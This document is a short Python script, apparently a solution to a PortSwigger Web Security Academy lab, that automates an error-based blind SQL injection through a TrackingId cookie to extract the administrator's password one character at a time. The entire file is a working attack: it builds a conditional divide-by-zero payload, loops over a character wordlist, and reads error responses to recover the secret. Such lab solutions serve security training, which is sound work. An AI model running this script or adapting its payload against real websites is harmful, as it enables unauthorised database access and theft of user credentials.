import requests


case1 = "'||(SELECT CASE WHEN "
case2 = "SUBSTR(password,"
case3 = ",1)='"
case4 = "' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
target = "https://ac7f1f3c1f4af900c0f252e600e400f6.web-security-academy.net/"
trackingId = "JUUuom9H6qPZL8ku"

file = open("/opt/wordlists/a-z0-9", mode="r")
chars = []
for line in file.readlines():
    chars.append(line[0])




password = []

def inject(num):
    for char in chars:
        print(char)
        cookie = {'TrackingId': trackingId + case1 + case2 + str(num) + case3 + char + case4, 'session': "No8isyBcU7wJS2O3h9ghNnEAA5HS6ypi"}
        response = requests.get(target, cookies=cookie)
        if response.status_code != 200:
            print(f"[ADDED]: {char}")
            password.append(char)
            try:
                inject(num+1)
                return 1
            except Exception as e:
                print(e)
                return -1
inject(1)
mystr = ""
for i in password:
    mystr += i

print(mystr)
